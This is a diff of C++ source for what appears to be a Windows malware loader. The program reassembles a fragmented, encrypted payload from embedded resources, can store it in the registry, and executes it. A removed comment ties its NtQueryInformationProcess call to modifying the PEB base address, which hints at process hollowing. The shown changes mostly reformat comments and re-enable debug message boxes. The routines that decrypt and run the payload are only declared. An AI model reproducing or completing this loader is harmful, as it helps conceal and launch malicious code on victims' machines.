@@ -6,9 +6,10 @@
 
 #pragma comment(lib, "ntdll.lib")
 
-//structures
+// ============================================================================
+// STRUCTURES AND DEFINITIONS
+// ============================================================================
 
-//header structure (only inside fragment 0)
 #pragma pack(push, 1)
 struct ChunkHeader {
     char magic[4];        // "FRAG" identifier
@@ -21,12 +22,12 @@ struct ChunkHeader {
 };
 #pragma pack(pop)
 
-const char* REGISTRY_KEY_PATH = "Software\\MyApp\\Chunks"; // curr registry path, change later
-const bool STORE_TO_REGISTRY = false; //temporary toggle for debug
+const char* REGISTRY_KEY_PATH = "Software\\MyApp\\Chunks";
+const bool STORE_TO_REGISTRY = false;
 
-typedef struct _PROCESS_BASIC_INFORMATION { //used process environment block, pair with NtQueryInformationProcess
+typedef struct _PROCESS_BASIC_INFORMATION {
     PVOID Reserved1;
-    PVOID PebBaseAddress; //example: used to modify PEB base address so the process knows where the executable is in memory.
+    PVOID PebBaseAddress;
     PVOID Reserved2[2];
     ULONG_PTR UniqueProcessId;
     PVOID Reserved3;
@@ -35,16 +36,23 @@ typedef struct _PROCESS_BASIC_INFORMATION { //used process environment block, pa
 using pNtQueryInformationProcess = NTSTATUS(WINAPI*)(
     HANDLE, ULONG, PVOID, ULONG, PULONG
 );
-//==== functions
+
+// ============================================================================
+// FUNCTION DECLARATIONS
+// ============================================================================
+
 unsigned char* GetPayloadResource(int id, const char* type, DWORD* size);
 std::vector<char> ReconstructFragmentedPayload();
 bool ValidateAndExecutePayload(char* payload, uint32_t payloadSize);
 uint32_t CalculateCRC32(const char* data, size_t length);
 bool StoreDecryptedPayloadToRegistry(const char* payload, uint32_t size);
 
+// ============================================================================
+// MAIN EXECUTION
+// ============================================================================
+
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
     
-    //start reconstruction
     std::vector<char> reconstructedPayload = ReconstructFragmentedPayload();
     
     if (reconstructedPayload.empty()) {
@@ -139,24 +147,23 @@ bool StoreDecryptedPayloadToRegistry(const char* payload, uint32_t size) {
 }
 
 std::vector<char> ReconstructFragmentedPayload() {
-    //gets current exe's module handle to access its resources
+    
     HMODULE hModule = GetModuleHandle(NULL);
     char debugMsg[512];
     
     if (!hModule) {
-        // MessageBoxA(NULL, "GetModuleHandle failed", "Debug", MB_ICONERROR);
+        MessageBoxA(NULL, "GetModuleHandle failed", "Debug", MB_ICONERROR);
         return {};
     }
     
     char exePath[MAX_PATH];
     GetModuleFileNameA(hModule, exePath, MAX_PATH);
     sprintf(debugMsg, "Running from: %s", exePath);
-    // MessageBoxA(NULL, debugMsg, "Debug Info", MB_OK);
+    MessageBoxA(NULL, debugMsg, "Debug Info", MB_OK);
     
-    // check if frag 0 exist
+    // Test FindResource directly
     HRSRC hResTest = FindResourceA(hModule, MAKEINTRESOURCEA(132), "BIN");
-
-    if (!hResTest) { //frag 0 not found, debug to find err
+    if (!hResTest) {
         DWORD error = GetLastError();
         sprintf(debugMsg, "FindResource failed for ID 132\nError code: %lu", error);
         MessageBoxA(NULL, debugMsg, "Resource Debug", MB_ICONERROR);
